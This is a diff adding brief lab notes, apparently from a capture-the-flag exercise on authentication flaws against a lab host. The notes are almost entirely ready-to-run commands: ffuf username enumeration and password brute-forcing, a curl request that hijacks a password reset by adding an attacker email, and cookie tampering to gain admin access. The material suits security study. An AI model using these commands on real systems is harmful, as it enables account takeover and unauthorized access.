@@ -1,0 +1,14 @@
+
+1. Use the signup page to enumerate already existing users.
+ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.92.94/customers/signup -mr "username already exists"
+
+2. Brute force the logins found.
+ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.92.94/customers/login -fc 200
+
+3. Logic Flaw
+curl 'http://10.10.92.94/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
+
+4. Cookies Tampering
+to crack hashes with wordlist: https://crackstation.net/ or it can be base64 and base32
+curl -H "Cookie: logged_in=true; admin=true" http://10.10.92.94/cookie-test
+curl -H "Cookie: logged_in=true; admin=true" http://10.10.92.94/cookie-test
